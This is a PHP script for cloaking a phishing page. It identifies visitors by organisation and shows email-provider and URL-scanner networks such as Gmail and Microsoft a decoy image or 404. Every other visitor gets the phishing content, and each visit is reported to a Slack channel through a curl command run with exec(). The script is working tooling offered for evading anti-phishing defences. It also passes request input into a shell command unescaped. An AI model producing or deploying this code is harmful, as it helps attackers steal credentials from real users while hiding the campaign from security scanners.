<?php

//AutoBlock Mode "true" means every IP but yours will get auto-added to the blacklist
$AutoBlock = true;
// Your public IP (your client)
$myip = "YOUR_IP_HERE";

// Gets URI that's accessed
$url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

// Determines if the URI is an IP or Domain (blocks if IP)
$parts = parse_url($url);
$isIP = (bool)ip2long($parts['host']);

$allowed = "- *Accessed Phishing Site* -";

// This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
$ip = $_SERVER['REMOTE_ADDR'];
// Can set your IP manually to see what Google sees
//$ip = "8.8.8.8";
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
$org = $details->org;

// AutoBlock Function
if ($AutoBlock == true && $ip != $myip){
$myfile = fopen("/var/www/html/blacklist.txt", "a") or die("Unable to open file!");
$txt = explode(' ', $org, 2)[1];
fwrite($myfile, "\r\n". $txt);
fclose($myfile);
}

// List of Orgs to be Blacklisted
$filename = "/var/www/html/blacklist.txt";

// Open the file
$fp = @fopen($filename, 'r'); 

// Add each line to an array
if ($fp) {
   $blockorgs = explode("\r\n", fread($fp, filesize($filename)));
}

//Block via blacklist
// Can whitelist your IP only (useful before "go live" for campaign). Need to switch comments for IF statements below.
//if($ip != "75.103.132.161") {
if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true) {

// Content for Orgs to see on the Blacklist (What everyone else sees)
echo "<HTML><BODY><IMG SRC=\"https://i.imgflip.com/42oih3.jpg\"></HTML></BODY>";

// Respond With 404 Instead of Image. More Likely to Fool URL Checkers
//header('HTTP/1.0 404 not found'); 
  
$allowed = "- *Jedi Mind Trick Successful* -";

} else {





// PUT YOUR PHISHING CONTENT WITHIN THESE ELSE BRACKETS!!!!
?>

<HTML><BODY>Log in here!</BODY></HTML>








<?php



$allowed = "- *Allowed* -";
}

if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}

// Slack Message
if(isset($_REQUEST['id'])){
$id = $_REQUEST['id'];

// Send Slack Notification
$message = ">".$url." was visited by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
} else {
$id = "";
$message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
}

// Set Slack Information Here
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "#general", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": ":bell:"}\' https://hooks.slack.com/services/SLACK_TOKEN_HERE';
//echo $cmd;
exec($cmd);

// You Can Uncomment If You Want to Use a Database to Capture Requests (ask me for stored procedure)
//$conn = mysqli_connect('127.0.0.1', 'USERNAME', 'PASSWORD', 'phishbypass');
//// Check connection
//if ($conn->connect_error) {
//    die("Connection failed: " . $conn->connect_error);
//}

//$sql = "CALL InsertData('$ip','$id','$org','$jedi','$url');";
//$result = $conn->query($sql);

//printf($conn->error);
//$conn->close();


?>
